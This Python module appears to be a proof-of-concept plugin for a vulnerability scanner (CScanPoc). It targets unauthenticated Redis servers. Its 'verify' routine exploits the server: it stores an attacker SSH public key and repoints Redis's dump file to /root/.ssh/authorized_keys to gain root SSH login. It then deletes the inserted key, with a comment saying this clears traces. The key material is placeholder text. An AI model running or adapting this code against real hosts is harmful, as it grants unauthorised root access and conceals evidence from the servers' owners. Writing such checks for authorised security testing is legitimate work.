# -*- coding: utf-8 -*-
import urllib.parse
import redis
import socket
import random
import socket
import time
import paramiko
from paramiko.ssh_exception import SSHException

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Redis_0103'  # 平台漏洞编号
    name = 'Redis getshell expliot (ssh authorized_keys)'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
    1 生成一对用于ssh验证的密钥对
    2 通过redis未授权访问漏洞,向redis插入一条记录,内容为已生成的公钥
    3 通过redis数据导出功能,将含有公钥的数据导出到/root/.ssh/authorized_keys
    4 使用自己的主机,通过ssh私钥与受害机进行匹配并登入
    '''  # 漏洞描述
    ref = 'https://_thorns.gitbooks.io/sec/content/redis_getshellzi_dong_hua_shi_jian_zhi_cron.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Redis'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b1dc9d99-f3ad-4a63-89e0-33d3464e75e5'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-08'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
        self.public_key = 'ssh-rsa ====='
        self.private_key = """
        -----BEGIN RSA PRIVATE KEY-----
        =====
        -----END RSA PRIVATE KEY-----
        """

    def checkPortTcp(self, target, port):
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.settimeout(10)
        try:
            sk.connect((target, port))
            return True
        except Exception:
            return False

    def testConnect(self, ip, port=22):
        try:
            s = paramiko.SSHClient()
            s.load_system_host_keys()
            s.connect(ip, port, username='root',
                      pkey=self.private_key, timeout=10)
            s.close()
            return True
        except Exception as e:
            if type(e) == SSHException:
                return True
            return False

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            target_parse = urllib.parse.urlparse(self.target)
            # url = self.target
            ip = socket.gethostbyname(target_parse.hostname)
            port = target_parse.port if target_parse.port else 6379
            if not self.checkPortTcp(ip, 22):
                return False
            r = redis.Redis(host=ip, port=port, db=0)
            if 'redis_version' in r.info():
                key = ''.join([chr(random.randint(97, 123))
                               for _i in range(10)])
                r.set(key, '\n\n' + self.public_key + '\n\n')
                r.config_set('dir', '/root/.ssh')
                r.config_set('dbfilename', 'authorized_keys')
                r.save()
                r.delete(key)  # 清除痕迹
                r.config_set('dir', '/tmp')
                time.sleep(5)
                if self.testConnect(ip, 22):
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
